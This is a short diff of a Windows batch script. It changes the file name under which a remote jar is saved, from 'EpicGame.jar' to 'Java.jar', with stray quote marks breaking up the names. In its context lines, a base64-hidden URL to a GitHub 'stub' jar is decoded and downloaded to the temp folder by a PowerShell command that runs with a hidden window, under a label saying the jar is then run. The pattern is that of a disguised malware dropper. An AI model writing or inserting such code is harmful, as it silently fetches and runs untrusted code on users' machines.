@@ -26,7 +26,7 @@ set PATH=%PATH%;%installDir%\jre1.8.0_361\bin
 
 :download_and_run_jar
 set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL2hlYWRzL21haW4vSmF2YS5qYXI="
-set "jarOutput=%TEMP%\Epi"c"Game.jar"
+set "jarOutput=%TEMP%\Ja"v"a.jar"
 
 powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"
 
